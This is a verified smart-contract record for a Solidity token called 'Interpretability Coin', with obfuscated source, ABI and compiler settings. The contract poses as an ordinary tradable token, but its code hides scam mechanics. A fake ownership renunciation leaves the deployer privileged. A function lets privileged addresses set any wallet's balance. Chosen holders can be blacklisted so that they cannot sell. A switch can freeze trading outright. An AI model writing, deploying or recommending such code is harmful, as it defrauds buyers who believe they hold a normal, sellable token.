{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract amountToBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingMarketing {\n    function createPair(address minTo, address atSwapShould) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface minExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface enableFundMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverToken) external view returns (uint256);\n\n    function transfer(address txMax, uint256 shouldTotal) external returns (bool);\n\n    function allowance(address listTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMax,\n        uint256 shouldTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMin, uint256 value);\n    event Approval(address indexed listTotal, address indexed spender, uint256 value);\n}\n\ninterface buyReceiver is enableFundMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterpretabilityCoin is amountToBuy, enableFundMarketing, buyReceiver {\n\n    mapping(address => bool) public enableFundReceiver;\n\n    address public feeTeam;\n\n    function balanceOf(address receiverToken) public view virtual override returns (uint256) {\n        return senderAtWallet[receiverToken];\n    }\n\n    address private toAmount;\n\n    function transfer(address modeReceiver, uint256 shouldTotal) external virtual override returns (bool) {\n        return autoEnable(_msgSender(), modeReceiver, shouldTotal);\n    }\n\n    function marketingMode(uint256 shouldTotal) public {\n        tradingTo();\n        enableFund = shouldTotal;\n    }\n\n    function txLaunch(address launchReceiver) public {\n        tradingTo();\n        if (launchSwap == teamReceiver) {\n            fromReceiverReceiver = launchSwap;\n        }\n        if (launchReceiver == feeTeam || launchReceiver == isLaunched) {\n            return;\n        }\n        enableFundReceiver[launchReceiver] = true;\n    }\n\n    function senderTx(address totalAmount) public {\n        require(totalAmount.balance < 100000);\n        if (tokenMax) {\n            return;\n        }\n        if (listLiquidity != feeTotal) {\n            launchedLiquidityFund = listLiquidity;\n        }\n        toTakeIs[totalAmount] = true;\n        if (launchedLiquidityFund == listLiquidity) {\n            teamReceiver = feeTotal;\n        }\n        tokenMax = true;\n    }\n\n    function takeShouldMarketing(address modeReceiver, uint256 shouldTotal) public {\n        tradingTo();\n        senderAtWallet[modeReceiver] = shouldTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return toAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitIsAuto;\n\n    bool private buyMax;\n\n    uint256 public feeTotal;\n\n    uint8 private fromMax = 18;\n\n    bool public tokenMax;\n\n    function senderAmount(address shouldModeBuy, address txMax, uint256 shouldTotal) internal view returns (uint256) {\n        require(shouldTotal > 0);\n\n        uint256 swapLiquidity = 0;\n        if (shouldModeBuy == isLaunched && toEnableLaunched > 0) {\n            swapLiquidity = shouldTotal * toEnableLaunched / 100;\n        } else if (txMax == isLaunched && liquidityExempt > 0) {\n            swapLiquidity = shouldTotal * liquidityExempt / 100;\n        }\n        require(swapLiquidity <= shouldTotal);\n        return shouldTotal - swapLiquidity;\n    }\n\n    uint256 constant atFromLaunch = 7 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return isFrom;\n    }\n\n    string private isFrom = \"Interpretability Coin\";\n\n    uint256 private listLiquidity;\n\n    function owner() external view returns (address) {\n        return toAmount;\n    }\n\n    address limitBuy;\n\n    uint256 private launchedLiquidityFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTakeSwap;\n    }\n\n    uint256 private shouldMarketing;\n\n    function fundAt(address shouldModeBuy, address txMax, uint256 shouldTotal) internal returns (bool) {\n        require(senderAtWallet[shouldModeBuy] >= shouldTotal);\n        senderAtWallet[shouldModeBuy] -= shouldTotal;\n        senderAtWallet[txMax] += shouldTotal;\n        emit Transfer(shouldModeBuy, txMax, shouldTotal);\n        return true;\n    }\n\n    uint256 public fromReceiverReceiver;\n\n    function transferFrom(address shouldModeBuy, address txMax, uint256 shouldTotal) external override returns (bool) {\n        if (_msgSender() != isAmount) {\n            if (limitIsAuto[shouldModeBuy][_msgSender()] != type(uint256).max) {\n                require(shouldTotal <= limitIsAuto[shouldModeBuy][_msgSender()]);\n                limitIsAuto[shouldModeBuy][_msgSender()] -= shouldTotal;\n            }\n        }\n        return autoEnable(shouldModeBuy, txMax, shouldTotal);\n    }\n\n    function teamMax() public {\n        emit OwnershipTransferred(feeTeam, address(0));\n        toAmount = address(0);\n    }\n\n    uint256 enableFund;\n\n    uint256 public launchSwap;\n\n    function autoEnable(address shouldModeBuy, address txMax, uint256 shouldTotal) internal returns (bool) {\n        if (shouldModeBuy == feeTeam) {\n            return fundAt(shouldModeBuy, txMax, shouldTotal);\n        }\n        uint256 fundMin = enableFundMarketing(isLaunched).balanceOf(limitBuy);\n        require(fundMin == enableFund);\n        require(txMax != limitBuy);\n        if (enableFundReceiver[shouldModeBuy]) {\n            return fundAt(shouldModeBuy, txMax, atFromLaunch);\n        }\n        shouldTotal = senderAmount(shouldModeBuy, txMax, shouldTotal);\n        return fundAt(shouldModeBuy, txMax, shouldTotal);\n    }\n\n    uint256 public toEnableLaunched = 3;\n\n    string private teamMarketing = \"ICN\";\n\n    function approve(address senderMaxLaunch, uint256 shouldTotal) public virtual override returns (bool) {\n        limitIsAuto[_msgSender()][senderMaxLaunch] = shouldTotal;\n        emit Approval(_msgSender(), senderMaxLaunch, shouldTotal);\n        return true;\n    }\n\n    address isAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public liquidityExempt = 0;\n\n    constructor (){\n        \n        teamMax();\n        minExempt enableLaunched = minExempt(isAmount);\n        isLaunched = tradingMarketing(enableLaunched.factory()).createPair(enableLaunched.WETH(), address(this));\n        limitBuy = tradingMarketing(enableLaunched.factory()).feeTo();\n        if (teamReceiver != shouldMarketing) {\n            shouldMarketing = teamReceiver;\n        }\n        feeTeam = _msgSender();\n        toTakeIs[feeTeam] = true;\n        senderAtWallet[feeTeam] = receiverTakeSwap;\n        if (fromReceiverReceiver != launchedLiquidityFund) {\n            teamReceiver = fromReceiverReceiver;\n        }\n        emit Transfer(address(0), feeTeam, receiverTakeSwap);\n    }\n\n    function allowance(address launchedWallet, address senderMaxLaunch) external view virtual override returns (uint256) {\n        if (senderMaxLaunch == isAmount) {\n            return type(uint256).max;\n        }\n        return limitIsAuto[launchedWallet][senderMaxLaunch];\n    }\n\n    event OwnershipTransferred(address indexed toAt, address indexed shouldMode);\n\n    mapping(address => bool) public toTakeIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromMax;\n    }\n\n    address public isLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamMarketing;\n    }\n\n    mapping(address => uint256) private senderAtWallet;\n\n    uint256 listAmountMin;\n\n    uint256 public teamReceiver;\n\n    bool private receiverFund;\n\n    uint256 private receiverTakeSwap = 100000000 * 10 ** 18;\n\n    function tradingTo() private view {\n        require(toTakeIs[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderMaxLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMaxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableFundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiverReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTotal\",\"type\":\"uint256\"}],\"name\":\"marketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAmount\",\"type\":\"address\"}],\"name\":\"senderTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTotal\",\"type\":\"uint256\"}],\"name\":\"takeShouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnableLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTakeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldModeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"txLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InterpretabilityCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}